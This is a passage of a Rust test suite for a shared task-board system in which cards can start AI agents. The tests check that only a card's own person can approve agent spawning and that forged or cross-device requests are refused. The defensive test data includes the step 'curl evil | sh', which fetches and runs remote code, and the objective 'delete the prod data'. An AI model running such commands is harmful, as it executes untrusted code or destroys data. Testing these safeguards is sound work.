    // p2's agent redoing the steps can't drop it either.
    b.c.set_steps(
        CARD2,
        &t.id,
        vec![Step {
            text: "tests".into(),
            ..Step::default()
        }],
    )
    .unwrap();
    sync(&a, &b);
    assert!(a.c.get_task(&t.id).unwrap().steps[0].spawn);
}

#[test]
fn another_persons_split_makes_no_helper_parts() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    let r = b.c.split(
        CARD2,
        &t.id,
        vec![NewSubtask {
            title: "part".into(),
            spawn: true,
            ..NewSubtask::default()
        }],
        vec![],
    );
    let (_, made) = r.unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        assert!(!s.c.get_task(&made[0].id).unwrap().spawn);
    }
}

/// Card #481: an answered item whose agent left the card closes from a
/// device of the raiser's person only; the other person's sweep writes
/// nothing (a row that folds to nothing there was written every sweep,
/// card #242).
#[test]
fn an_answered_item_whose_agent_left_closes_from_the_raisers_device() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    let (_, item) = ask(&a, CARD1, &t.id, "which port?", None).unwrap();
    a.c.answer(
        P1,
        &t.id,
        &item.id,
        BlockerAnswer {
            text: "8080".into(),
            ..BlockerAnswer::default()
        },
    )
    .unwrap();
    a.c.leave(CARD1, &t.id, CARD1).unwrap();
    sync(&a, &b);
    let mine = |s: &Side, dev: &str| {
        s.st.list(&store::Filter {
            device_id: dev.into(),
            limit: store::MAX_LIST_LIMIT,
            ..store::Filter::default()
        })
        .unwrap()
        .len()
    };
    let n = mine(&b, "dev-b");
    b.c.sweep_notices().unwrap();
    assert_eq!(mine(&b, "dev-b"), n, "p2's device wrote for p1's agent");
    assert_eq!(b.c.get_task(&t.id).unwrap().state, BLOCKED);
    a.c.sweep_notices().unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        let got = s.c.get_task(&t.id).unwrap();
        assert_eq!(got.state, WORKING, "{got:?}");
        let r = got.blockers[0].resolved.as_ref().expect("closed");
        assert_eq!(r.by, "irori");
    }
    let n = mine(&a, "dev-a");
    a.c.sweep_notices().unwrap();
    assert_eq!(mine(&a, "dev-a"), n, "closed once");
}

/// Card #485: a board's log keeps no device.started rows, so a version
/// wait there could never close: it is refused, with where it goes.
#[test]
fn a_version_wait_on_a_board_is_refused() {
    let (a, _b, _) = two_people();
    let t = a.c.create_task(P1, nt("live check", REPO_A)).unwrap();
    a.c.claim_task(CARD1, &t.id).unwrap();
    let err =
        a.c.block(
            CARD1,
            &t.id,
            "Update the Mac",
            Some(BlockedBy {
                kind: BLOCKED_ON_VERSION.into(),
                reference: "0.11.0 dev-a".into(),
            }),
        )
        .unwrap_err();
    assert!(err.is(ErrorKind::Invalid), "{err}");
    assert!(err.to_string().contains("a private card"), "{err}");
}

/// Card #540: on a board too the person's answer to the crash question,
/// sent as a resolve, goes on its thread under their board key, where the
/// next agent's brief reads it, and clears the run.
#[test]
fn a_board_cards_crash_answer_goes_on_its_thread() {
    let ra = TestRoster::new(&[CARD1]);
    let (a, _b, _) = two_people_with(Some(ra.clone()), None);
    let t = a.c.create_task(P1, nt("kills its agent", REPO_A)).unwrap();
    for _ in 0..MAX_SPAWN_CRASHES {
        ra.set(CARD1, "idle");
        a.c.sweep_notices().unwrap();
        let g =
            a.c.request_spawn("irori", spawn_ask(&t.id, "dev-a"))
                .unwrap()
                .unwrap();
        assert!(a.c.bind_spawn(&t.id, g, CARD1).unwrap());
        a.c.claim_task(CARD1, &t.id).unwrap();
        ra.set(CARD1, "");
        a.c.sweep_notices().unwrap();
        a.clk.add(HOLDER_GRACE + std::time::Duration::from_secs(1));
        a.c.sweep_notices().unwrap();
    }
    let got = a.c.get_task(&t.id).unwrap();
    assert_eq!(got.spawn_crashes, MAX_SPAWN_CRASHES, "{got:?}");
    let q = got
        .blockers
        .iter()
        .find(|b| b.open() && is_crash_question(b))
        .expect("the person is asked")
        .clone();
    a.c.answer(
        P1,
        &t.id,
        &q.id,
        BlockerAnswer {
            text: "try the smaller fixture".into(),
            resolve: true,
            ..BlockerAnswer::default()
        },
    )
    .unwrap();
    let got = a.c.get_task(&t.id).unwrap();
    assert_eq!(got.state, SUBMITTED, "{got:?}");
    assert_eq!(got.spawn_crashes, 0);
    let cs = a.c.comments(&t.id).unwrap();
    assert!(
        cs.iter()
            .any(|c| c.by == P1 && c.text == "try the smaller fixture"),
        "{cs:?}"
    );
}

/// Card #512: a thread in a board's own log gets its own agent at once,
/// on the poster's device only, like a board card on the device that made
/// it (#455). It names a card both people's agents hold: they are woken,
/// and nobody waits on them. One with "Agents answer now" off never spawns.
#[test]
fn a_board_thread_spawns_on_the_posters_device_at_once() {
    let (a, b, owners) = two_people();
    let card = shared_card(&a, &b);
    let on = || Options {
        spawning: Some(Arc::new(|| true)),
        ..Options::default()
    };
    let a = side_reopen_with(a, P1, &owners, on());
    let b = side_reopen_with(b, P2, &owners, on());
    let thread = |text: &str, quiet: bool| {
        a.c.post_ask(
            P1,
            NewAsk {
                text: text.into(),
                thread: true,
                quiet,
                ..NewAsk::default()
            },
            &[],
        )
        .unwrap()
        .0
    };
    let tk = thread(&format!("Is #{} still moving?", card.short), false);
    let off = thread(&format!("A note on #{}", card.short), true);
    sync(&a, &b);
    assert_eq!(
        b.c.get_task(&tk.id).unwrap().ask.unwrap().heard,
        [CARD1, CARD2]
    );
    // The first sweep, with no clock advance: nobody free, so unclaimed,
    // and listed on p1's device only.
    a.c.sweep_asks(&[]).unwrap();
    b.c.sweep_asks(&[]).unwrap();
    sync(&a, &b);
    assert_eq!(ids(&a.c.cards_to_spawn()), std::slice::from_ref(&tk.id));
    assert!(
        b.c.cards_to_spawn().is_empty(),
        "{:?}",
        b.c.cards_to_spawn()
    );
    // p2's device can't ask for it either.
    assert_eq!(
        b.c.request_spawn("irori", spawn_ask(&tk.id, "dev-b")).ok(),
        Some(None)
    );

    // p1's device starts it, and its agent takes the thread on both sides.
    let g =
        a.c.request_spawn("irori", spawn_ask(&tk.id, "dev-a"))
            .unwrap()
            .unwrap();
    assert!(a.c.bind_spawn(&tk.id, g, CARD1).unwrap());
    sync(&a, &b);
    for s in [&a, &b] {
        let ask = s.c.get_task(&tk.id).unwrap().ask.unwrap();
        assert!(ask.taker == CARD1 && ask.reason == TAKE_TAKEN, "{ask:?}");
        assert!(s.c.cards_to_spawn().is_empty());
    }
    // Agents answer now off: never handed out, never spawned for.
    assert!(
        !ids(&a.c.cards_to_spawn()).contains(&off.id),
        "{:?}",
        a.c.get_task(&off.id).unwrap().ask
    );
}

/// Card #631: p1's agent opens a thread in the space's log. It holds it on
/// both sides, nothing hands it out or starts an agent for it on either
/// device, even after it gives it back and p2 writes in it; p1's own post
/// lists it on p1's device only, and p1 resolves it.
#[test]
fn an_agents_board_thread_waits_for_its_own_person() {
    let (a, b, owners) = two_people();
    let on = || Options {
        spawning: Some(Arc::new(|| true)),
        ..Options::default()
    };
    let a = side_reopen_with(a, P1, &owners, on());
    let b = side_reopen_with(b, P2, &owners, on());
    let (tk, _) =
        a.c.post_agent_thread(
            CARD1,
            NewAsk {
                text: "The deploy needs a key only you have. Can you add it?".into(),
                thread: true,
                ..NewAsk::default()
            },
        )
        .unwrap();
    // p2's agent can't open one from p1's device.
    want_err(
        a.c.post_agent_thread(
            CARD2,
            NewAsk {
                text: "Not mine to write".into(),
                thread: true,
                ..NewAsk::default()
            },
        ),
        ErrorKind::NotAllowed,
    );
    sync(&a, &b);
    let quiet = |why: &str| {
        a.c.sweep_asks(&[]).unwrap();
        b.c.sweep_asks(&[]).unwrap();
        sync(&a, &b);
        for s in [&a, &b] {
            assert!(s.c.cards_to_spawn().is_empty(), "{why}");
            let t = s.c.get_task(&tk.id).unwrap();
            assert!(!s.c.waits_for_agent(&t), "{why}");
        }
        assert_eq!(
            a.c.request_spawn("irori", spawn_ask(&tk.id, "dev-a")).ok(),
            Some(None),
            "{why}"
        );
    };
    for s in [&a, &b] {
        let ask = s.c.get_task(&tk.id).unwrap().ask.unwrap();
        assert!(ask.opener == CARD1 && ask.taker == CARD1, "{ask:?}");
    }
    quiet("held by its opener");
    a.c.leave(CARD1, &tk.id, CARD1).unwrap();
    quiet("given back");
    let ask = a.c.get_task(&tk.id).unwrap().ask.unwrap();
    assert!(
        ask.taker.is_empty() && ask.reason == TAKE_ANSWERED,
        "{ask:?}"
    );
    // Another member's words never start p1's agent.
    b.c.person_comment(P2, &tk.id, "I can add it too.", true, &[], None)
        .unwrap();
    sync(&a, &b);
    quiet("p2 wrote");
    // p1 writes: while its opener is live, the post goes to it.
    let (_, ns) =
        a.c.person_comment(P1, &tk.id, "Done, it's in.", true, &[], None)
            .unwrap();
    assert!(
        ns.iter().any(|n| n.to.contains(&CARD1.to_string())),
        "{ns:?}"
    );
    // Its opener is live (this rig has no presence to lose it): it answers,
    // and no other agent starts on either device.
    quiet("p1 wrote, its opener live");
    // p1 resolves the thread their agent opened; p2 can't.
    want_err(b.c.resolve_thread(P2, &tk.id), ErrorKind::NotAllowed);
    a.c.resolve_thread(P1, &tk.id).unwrap();
    sync(&a, &b);
    // And reopens it: open again on both sides, as a thread.
    a.c.reopen_thread(P1, &tk.id).unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        let t = s.c.get_task(&tk.id).unwrap();
        assert!(t.open_ask().is_some_and(|a| a.thread), "{t:?}");
    }
}

/// Card #477 (docs/design/work-personal-separation.md §3): on one space,
/// p2's card is never p1's to start, and the reverse. Both sides turn
/// spawning on here: each lists only its own person's card. Since #455 a
/// board log takes `task.spawn` rows, but only the card author's devices'
/// count: p1's sweep and p1's agent asking for p2's card change nothing
/// on either side, and no device is asked to start it.
#[test]
fn another_persons_card_is_never_spawned_on_your_side() {
    let (a, b, owners) = two_people();
    let theirs = b.c.create_task(P2, nt("Work card", "")).unwrap();
    let mine = a.c.create_task(P1, nt("Personal card", "")).unwrap();
    sync(&a, &b);
    let on = || Options {
        spawning: Some(Arc::new(|| true)),
        ..Options::default()
    };
    let a = side_reopen_with(a, P1, &owners, on());
    let b = side_reopen_with(b, P2, &owners, on());
    assert_eq!(ids(&a.c.cards_to_spawn()), std::slice::from_ref(&mine.id));
    assert_eq!(ids(&b.c.cards_to_spawn()), std::slice::from_ref(&theirs.id));
    // p1's sweep asks for an agent for p2's card anyway.
    let _ = a.c.request_spawn(
        "irori",
        SpawnAsk {
            task_id: theirs.id.clone(),
            device: "dev-a".into(),
            folder: "/work".into(),
            permission_mode: "default".into(),
            name: "for-theirs".into(),
            ..SpawnAsk::default()
        },
    );
    // One of p1's agents writing it straight to the log.
    let row = coord::rows::TaskSpawnRow {
        task_id: theirs.id.clone(),
        generation: 1,
        op: "requested".into(),
        device: "dev-a".into(),
        permission_mode: "default".into(),
        by: CARD1.into(),
        at: fixed_now(),
        ..Default::default()
    };
    if let Ok(ev) = a.st.append(CARD1, kinds::TASK_SPAWN, &row) {
        a.c.fold_live(&[ev]);
    }
    sync(&a, &b);
    for s in [&a, &b] {
        let t = s.c.get_task(&theirs.id).unwrap();
        assert!(t.spawn_request().is_none(), "{:?}", t.spawn_request());
        assert!(s.c.spawns_here().is_empty(), "{:?}", s.c.spawns_here());
    }
    assert!(!ids(&a.c.cards_to_spawn()).contains(&theirs.id));
    assert_eq!(ids(&b.c.cards_to_spawn()), std::slice::from_ref(&theirs.id));
}

// Card #455 (spawned agents §7, §9, part 11): who may start an agent on a
// shared board. p1 is Stephen on dev-a, p2 is a second person on dev-b.

fn spawn_ask(id: &str, device: &str) -> SpawnAsk {
    SpawnAsk {
        task_id: id.into(),
        device: device.into(),
        permission_mode: "acceptEdits".into(),
        name: "otter".into(),
        ..SpawnAsk::default()
    }
}

fn spawn_row(id: &str, device: &str, by: &str, at: GoTime) -> coord::rows::TaskSpawnRow {
    coord::rows::TaskSpawnRow {
        task_id: id.into(),
        generation: 1,
        op: SPAWN_REQUESTED.into(),
        device: device.into(),
        permission_mode: "acceptEdits".into(),
        name: "otter".into(),
        by: by.into(),
        at,
        ..Default::default()
    }
}

/// The second person's request naming Stephen's device is never one his
/// device acts on: not on their own card (it folds there, as their own
/// card's request, but names a device that isn't theirs), and not on his
/// card (refused by the writer check).
#[test]
fn another_persons_spawn_request_never_starts_an_agent_on_my_device() {
    let (a, b) = two_people_shared();
    let theirs = b.c.create_task(P2, nt("Their card", "")).unwrap();
    let mine = a.c.create_task(P1, nt("My card", "")).unwrap();
    sync(&a, &b);
    // Their request on their own card, naming dev-a, from their device.
    assert!(
        b.c.request_spawn(P2, spawn_ask(&theirs.id, "dev-a"))
            .unwrap()
            .is_some()
    );
    // Their request on my card, naming dev-a: as them, and as Irori on
    // their device.
    for (actor, by) in [(P2, P2), ("irori", "irori")] {
        let ev =
            b.st.append(
                actor,
                kinds::TASK_SPAWN,
                &spawn_row(&mine.id, "dev-a", by, b.clk.now()),
            )
            .unwrap();
        b.c.fold_live(&[ev]);
    }
    sync(&a, &b);
    assert!(
        a.c.spawns_here().is_empty(),
        "nothing for dev-a to start: {:?}",
        a.c.spawns_here()
    );
    assert!(!a.c.get_task(&mine.id).unwrap().spawn_pending());
    // My own request on my card naming my device is mine to start, and
    // their device never starts it.
    assert!(
        a.c.request_spawn(P1, spawn_ask(&mine.id, "dev-a"))
            .unwrap()
            .is_some()
    );
    sync(&a, &b);
    let here: Vec<String> = a.c.spawns_here().into_iter().map(|(t, _)| t.id).collect();
    assert_eq!(here, vec![mine.id.clone()]);
    assert!(b.c.spawns_here().is_empty());
}

/// A request from Stephen's other device (dev-a2, his Irori) naming dev-a
/// is dev-a's to start.
#[test]
fn my_other_devices_request_naming_this_device_is_mine_to_start() {
    let (a, _b) = two_people_shared();
    let t = a.c.create_task(P1, nt("Mac repo", "")).unwrap();
    let ev = Event {
        device_id: "dev-a2".into(),
        seq: 1,
        hlc: hlc::Timestamp(((a.clk.now().unix_milli_value() as u64) << 16) + 1),
        actor: "irori".into(),
        kind: kinds::TASK_SPAWN.into(),
        payload: gocompat::json::marshal(&spawn_row(&t.id, "dev-a", "irori", a.clk.now())).unwrap(),
        sig: Vec::new(),
    };
    let (_, r) = a.st.insert_batch(std::slice::from_ref(&ev));
    r.unwrap();
    a.c.fold_live(&[ev]);
    assert_eq!(a.c.spawns_here().len(), 1);
    assert_eq!(a.c.spawns_here()[0].1.device, "dev-a");
}

/// Stephen's spawned agent bound to his board card carries its mark on
/// the second person's device too, and their hand-out never offers it
/// their card, even when it is idle there.
#[test]
fn my_spawned_agent_is_never_offered_another_persons_card() {
    let (a, b) = two_people_shared();
    let mine = a.c.create_task(P1, nt("My card", "")).unwrap();
    let g =
        a.c.request_spawn("irori", spawn_ask(&mine.id, "dev-a"))
            .unwrap()
            .unwrap();
    assert!(a.c.bind_spawn(&mine.id, g, CARD1).unwrap());
    let theirs = b.c.create_task(P2, nt("Their card", "")).unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        assert_eq!(
            s.c.spawned(CARD1).map(|m| m.task_id),
            Some(mine.id.clone()),
            "the mark folds on {}",
            s.c.device_id()
        );
        assert!(
            s.c.get_task(&mine.id)
                .unwrap()
                .holders
                .iter()
                .any(|h| h == CARD1),
            "bound on {}",
            s.c.device_id()
        );
    }
    let (ns, r) = b.c.sweep_asks_partial(&roster(&[CARD1]));
    r.unwrap();
    assert!(ns.is_empty(), "{ns:?}");
    assert!(
        b.c.get_task(&theirs.id)
            .unwrap()
            .live_offer()
            .is_none_or(|o| o.to != CARD1)
    );
    // Their Irori can't mark my agent as started for their card.
    let ev =
        b.st.append(
            "irori",
            kinds::TASK_SPAWNED,
            &raw(&format!(
                r#"{{"taskId":"{}","key":"{CARD1}","gen":1,"device":"dev-a","by":"irori","at":"2026-10-26T12:00:00Z"}}"#,
                theirs.id
            )),
        )
        .unwrap();
    b.c.fold_live(&[ev]);
    sync(&a, &b);
    assert_eq!(a.c.spawned(CARD1).map(|m| m.task_id), Some(mine.id.clone()));
    // Nor can their Irori add their card to my agent's items (A.3).
    let ev =
        b.st.append(
            "irori",
            kinds::AGENT_TOOK,
            &raw(&format!(
                r#"{{"key":"{CARD1}","taskId":"{}","life":1,"by":"irori","at":"2026-10-26T12:00:00Z"}}"#,
                theirs.id
            )),
        )
        .unwrap();
    b.c.fold_live(&[ev]);
    sync(&a, &b);
    for s in [&a, &b] {
        let m = s.c.spawned(CARD1).unwrap();
        assert_eq!(m.items.len(), 1, "on {}", s.c.device_id());
        assert!(!m.serves(&theirs.id), "on {}", s.c.device_id());
    }
}

// Card #573: a card another person gives you. p2 made it on dev-b and gives
// it to p1, on dev-a.

fn given(a: &Side, b: &Side) -> Task {
    let t = b.c.create_task(P2, nt("Their card", "")).unwrap();
    b.c.assign(P2, &t.id, P1).unwrap();
    sync(a, b);
    assert_eq!(a.c.given_to_ask().len(), 1, "p1 is to be asked");
    a.c.ask_given(P1, &t.id, "p2 gave you this card.").unwrap();
    sync(a, b);
    a.c.get_task(&t.id).unwrap()
}

fn given_question(t: &Task) -> Blocker {
    t.blockers
        .iter()
        .find(|b| b.question == GIVEN_QUESTION)
        .expect("asked")
        .clone()
}

fn say(a: &Side, by: &str, t: &Task, pick: i64) {
    let q = given_question(t);
    a.c.answer(
        by,
        &t.id,
        &q.id,
        BlockerAnswer {
            pick,
            resolve: true,
            ..BlockerAnswer::default()
        },
    )
    .unwrap();
}

#[test]
fn a_given_card_is_asked_once_and_nothing_starts_before_the_yes() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    assert!(a.c.given_to_ask().is_empty(), "asked once");
    assert!(b.c.given_to_ask().is_empty(), "never the giver's to ask");
    assert!(a.c.given_to_spawn().is_empty());
    assert!(
        a.c.request_spawn(P1, spawn_ask(&t.id, "dev-a"))
            .unwrap()
            .is_none(),
        "no request before the yes"
    );
    // A request forced past that check starts and binds nothing.
    let ev =
        a.st.append(
            "irori",
            kinds::TASK_SPAWN,
            &spawn_row(&t.id, "dev-a", "irori", a.clk.now()),
        )
        .unwrap();
    a.c.fold_live(&[ev]);
    let got = a.c.get_task(&t.id).unwrap();
    assert!(!a.c.mine_to_start(&got, got.spawn_request().unwrap()));
    assert!(a.c.spawns_here().is_empty());
}

#[test]
fn the_giver_writes_no_spawn_rows_for_a_card_they_gave_away() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    say(&a, P1, &t, 1);
    sync(&a, &b);
    // The yes is p1's: p2's device still can't ask, even naming dev-a.
    for (actor, by) in [(P2, P2), ("irori", "irori")] {
        let ev =
            b.st.append(
                actor,
                kinds::TASK_SPAWN,
                &spawn_row(&t.id, "dev-a", by, b.clk.now()),
            )
            .unwrap();
        b.c.fold_live(&[ev]);
    }
    sync(&a, &b);
    assert!(!a.c.get_task(&t.id).unwrap().spawn_pending());
    assert!(a.c.spawns_here().is_empty());
}

#[test]
fn only_the_persons_own_yes_counts() {
    let (a, b) = two_people_shared();
    // An agent's pick says nothing: no yes, and p1 is asked again.
    let t = given(&a, &b);
    say(&a, CARD1, &t, 1);
    sync(&a, &b);
    let got = a.c.get_task(&t.id).unwrap();
    assert!(got.given_said.is_none(), "{:?}", got.given_said);
    assert!(a.c.given_to_spawn().is_empty());
    assert_eq!(a.c.given_to_ask().len(), 1, "asked again");
}

#[test]
fn the_givers_answer_is_not_my_yes() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    let q = given_question(&t);
    b.c.answer(
        P2,
        &t.id,
        &q.id,
        BlockerAnswer {
            pick: 1,
            resolve: true,
            ..BlockerAnswer::default()
        },
    )
    .unwrap();
    sync(&a, &b);
    assert!(a.c.given_to_spawn().is_empty());
}

#[test]
fn not_now_stands_until_it_is_given_again() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    say(&a, P1, &t, 2);
    sync(&a, &b);
    assert!(a.c.given_to_spawn().is_empty());
    assert!(a.c.given_to_ask().is_empty(), "Not now stands");
    // A give from p2 asks again; it writes though p1 still holds the card.
    b.c.assign(P2, &t.id, P1).unwrap();
    sync(&a, &b);
    assert_eq!(a.c.given_to_ask().len(), 1, "given again");
}

#[test]
fn an_earlier_reply_never_stands_as_my_yes() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    let q = given_question(&t);
    // p2 writes "Start an agent" as a reply on my question, not resolving.
    b.c.answer(
        P2,
        &t.id,
        &q.id,
        BlockerAnswer {
            pick: 1,
            ..BlockerAnswer::default()
        },
    )
    .unwrap();
    sync(&a, &b);
    // My Mark resolved, with a note saying no.
    a.c.answer(
        P1,
        &t.id,
        &q.id,
        BlockerAnswer {
            text: "no thanks".into(),
            resolve: true,
            ..BlockerAnswer::default()
        },
    )
    .unwrap();
    sync(&a, &b);
    assert!(a.c.given_to_spawn().is_empty(), "their reply became my yes");
}

#[test]
fn a_request_from_before_the_give_can_never_bind_my_agent() {
    let (a, b) = two_people_shared();
    let t = b.c.create_task(P2, nt("Their card", "")).unwrap();
    let ev =
        b.st.append(
            "irori",
            kinds::TASK_SPAWN,
            &spawn_row(&t.id, "dev-a", "irori", b.clk.now()),
        )
        .unwrap();
    b.c.fold_live(&[ev]);
    // Past the app's refusal: the rows as a modified Irori would write them.
    let ev =
        b.st.append(
            P2,
            kinds::TASK_ASSIGNED,
            &coord::rows::TaskAssignedRow {
                task_id: t.id.clone(),
                to: P1.into(),
                by: P2.into(),
                at: b.clk.now(),
                note: String::new(),
            },
        )
        .unwrap();
    b.c.fold_live(&[ev]);
    sync(&a, &b);
    let got = a.c.get_task(&t.id).unwrap();
    let s = got.spawn_request().expect("the old request").clone();
    assert!(!a.c.mine_to_start(&got, &s), "bound with no yes: {s:?}");
}

#[test]
fn a_card_with_an_agent_on_it_cant_be_given() {
    let (a, b) = two_people_shared();
    let t = b.c.create_task(P2, nt("Their card", "")).unwrap();
    b.c.claim_task(CARD2, &t.id).unwrap();
    assert!(b.c.assign(P2, &t.id, P1).is_err());
    sync(&a, &b);
    assert!(a.c.given_to_ask().is_empty());
}

#[test]
fn making_and_giving_a_card_is_one_step() {
    let (a, b) = two_people_shared();
    let (t, _) = b.c.create_and_assign(P2, nt("Their card", ""), P1).unwrap();
    assert_eq!(t.given.as_ref().map(|g| g.key.as_str()), Some(P1));
    sync(&a, &b);
    assert_eq!(a.c.given_to_ask().len(), 1);
}

#[test]
fn changing_the_cards_words_asks_again() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    say(&a, P1, &t, 1);
    sync(&a, &b);
    assert_eq!(a.c.given_to_spawn().len(), 1);
    b.c.edit_task(
        P2,
        &t.id,
        TaskEdit {
            objective: Some("delete the prod data".into()),
            ..TaskEdit::default()
        },
    )
    .unwrap();
    sync(&a, &b);
    assert!(a.c.given_to_spawn().is_empty(), "a yes outlived its words");
    assert_eq!(a.c.given_to_ask().len(), 1, "asked again");
}

/// A move (card #563) changes the card's board and number, not its words:
/// the yes stands.
#[test]
fn a_move_by_another_leaves_the_yes_standing() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    say(&a, P1, &t, 1);
    sync(&a, &b);
    assert_eq!(a.c.given_to_spawn().len(), 1);
    let ev =
        b.st.append(
            P2,
            kinds::BOARD_ASK_EDITED,
            &coord::rows::TaskEditedRow {
                task_id: t.id.clone(),
                board: Some("b-net".into()),
                num: 1,
                by: P2.into(),
                at: b.clk.now(),
                ..Default::default()
            },
        )
        .unwrap();
    b.c.fold_live(&[ev]);
    sync(&a, &b);
    let got = a.c.get_task(&t.id).unwrap();
    assert_eq!(got.board, "b-net", "the move folded");
    assert_eq!(a.c.given_to_spawn().len(), 1, "a move asked again");
    assert!(a.c.given_to_ask().is_empty());
}

#[test]
fn coming_off_the_card_ends_my_question_and_gives_it_back() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    a.c.leave(P1, &t.id, P1).unwrap();
    sync(&a, &b);
    let got = b.c.get_task(&t.id).unwrap();
    assert!(got.given.is_none(), "{:?}", got.given);
    assert!(
        got.blockers.iter().all(|x| !x.open()),
        "question stays open"
    );
    assert_ne!(got.state, BLOCKED, "left blocked with nobody to answer");
    assert!(b.c.mine_to_serve(&got), "back with its author");
}

#[test]
fn the_yes_is_the_persons_device_and_one_yes_starts_one_agent() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    say(&a, P1, &t, 1);
    sync(&a, &b);
    let ids: Vec<String> = a.c.given_to_spawn().into_iter().map(|t| t.id).collect();
    assert_eq!(ids, vec![t.id.clone()]);
    assert!(b.c.given_to_spawn().is_empty());
    let g =
        a.c.request_spawn("irori", spawn_ask(&t.id, "dev-a"))
            .unwrap()
            .expect("the yes lets it through");
    sync(&a, &b);
    assert!(b.c.get_task(&t.id).unwrap().spawn_pending(), "p2 folds it");
    assert!(a.c.given_to_spawn().is_empty(), "one is starting");
    assert!(a.c.bind_spawn(&t.id, g, CARD1).unwrap());
    sync(&a, &b);
    let got = a.c.get_task(&t.id).unwrap();
    assert!(a.c.mine_to_serve(&got), "still p1's once its agent has it");
    assert!(!b.c.mine_to_serve(&b.c.get_task(&t.id).unwrap()));
    assert_eq!(
        b.c.spawned(CARD1).map(|m| m.task_id),
        Some(t.id.clone()),
        "p2's fold marks the agent, so its hand-out skips it"
    );
    assert!(
        b.c.get_task(&t.id)
            .unwrap()
            .holders
            .iter()
            .any(|h| h == CARD1),
        "the bind's assignment folds on p2's side"
    );
    assert!(a.c.given_to_ask().is_empty(), "the agent has it");
    assert!(a.c.given_to_spawn().is_empty());
}

#[test]
fn a_card_i_assign_to_myself_or_a_private_card_is_not_given() {
    let (a, b) = two_people_shared();
    let t = a.c.create_task(P1, nt("Mine", "")).unwrap();
    a.c.assign(P1, &t.id, P1).unwrap();
    let theirs = b.c.create_task(P2, nt("Theirs", "")).unwrap();
    b.c.assign(P2, &theirs.id, P2).unwrap();
    sync(&a, &b);
    assert!(a.c.given_to_ask().is_empty());
    assert!(b.c.given_to_ask().is_empty());
}

/// A question nobody's Irori raised for the person: an agent's, or a row
/// another member's device wrote in their name. Their pick on it is no yes.
#[test]
fn a_yes_stands_only_on_the_question_my_own_irori_raised() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    say(&a, P1, &t, 2);
    sync(&a, &b);
    // p2's device writes the question in p1's name after the Not now.
    let ev =
        b.st.append(
            P1,
            kinds::TASK_STATUS,
            &coord::rows::TaskStateRow {
                task_id: t.id.clone(),
                state: BLOCKED.into(),
                by: P1.into(),
                at: b.clk.now(),
                blocker: Some(coord::rows::BlockerRow {
                    id: "b9".into(),
                    question: GIVEN_QUESTION.into(),
                    context: "forged".into(),
                    options: vec![BlockerOption {
                        answer: GIVEN_START.into(),
                        ..BlockerOption::default()
                    }],
                    ..Default::default()
                }),
                ..Default::default()
            },
        )
        .unwrap();
    b.c.fold_live(&[ev]);
    sync(&a, &b);
    let got = a.c.get_task(&t.id).unwrap();
    assert!(
        got.given_said.as_ref().is_some_and(|y| !y.yes),
        "the Not now stands: {:?}",
        got.given_said
    );
    a.c.answer(
        P1,
        &t.id,
        "b9",
        BlockerAnswer {
            pick: 1,
            resolve: true,
            ..BlockerAnswer::default()
        },
    )
    .unwrap();
    sync(&a, &b);
    assert!(
        a.c.given_to_spawn().is_empty(),
        "a yes on a forged question"
    );
}

/// The words change between the request and its agent showing: the
/// request has no yes, is stale after the grace, and the card isn't pinned.
#[test]
fn a_request_that_lost_its_yes_doesnt_pin_the_card() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    say(&a, P1, &t, 1);
    sync(&a, &b);
    assert!(
        a.c.request_spawn("irori", spawn_ask(&t.id, "dev-a"))
            .unwrap()
            .is_some()
    );
    sync(&a, &b);
    b.c.edit_task(
        P2,
        &t.id,
        TaskEdit {
            objective: Some("something else".into()),
            ..TaskEdit::default()
        },
    )
    .unwrap();
    sync(&a, &b);
    let got = a.c.get_task(&t.id).unwrap();
    assert!(!a.c.mine_to_start(&got, got.spawn_request().unwrap()));
    a.clk.add(SPAWN_GRACE + std::time::Duration::from_secs(1));
    assert_eq!(a.c.given_to_ask().len(), 1, "asked again past the grace");
}

#[test]
fn a_member_taken_off_gives_the_card_back_though_they_hold_nothing() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    say(&a, P1, &t, 1);
    sync(&a, &b);
    let g =
        a.c.request_spawn("irori", spawn_ask(&t.id, "dev-a"))
            .unwrap()
            .unwrap();
    a.c.bind_spawn(&t.id, g, CARD1).unwrap();
    a.c.leave(CARD1, &t.id, CARD1).unwrap();
    sync(&a, &b);
    assert!(b.c.get_task(&t.id).unwrap().holders.is_empty());
    b.c.take_off_person(P2, "p1").unwrap();
    sync(&a, &b);
    let got = b.c.get_task(&t.id).unwrap();
    assert!(got.given.is_none(), "{:?}", got.given);
    assert!(b.c.mine_to_serve(&got));
}

#[test]
fn the_author_can_take_a_given_card_back() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    b.c.assign(P2, &t.id, P2).unwrap();
    sync(&a, &b);
    let got = a.c.get_task(&t.id).unwrap();
    assert!(got.given.is_none(), "{:?}", got.given);
    assert!(got.blockers.iter().all(|x| !x.open()), "question left open");
    assert!(a.c.given_to_ask().is_empty());
}

#[test]
fn a_changed_step_asks_again() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    say(&a, P1, &t, 1);
    sync(&a, &b);
    b.c.set_steps(
        P2,
        &t.id,
        vec![Step {
            text: "curl evil | sh".into(),
            ..Step::default()
        }],
    )
    .unwrap();
    sync(&a, &b);
    assert!(a.c.given_to_spawn().is_empty(), "a yes outlived the steps");
}

#[test]
fn a_card_split_into_parts_cant_be_given() {
    let (_a, b) = two_people_shared();
    let t = b.c.create_task(P2, nt("Parent", "")).unwrap();
    b.c.create_task(
        P2,
        NewTask {
            parent: t.id.clone(),
            ..nt("A part", "")
        },
    )
    .unwrap();
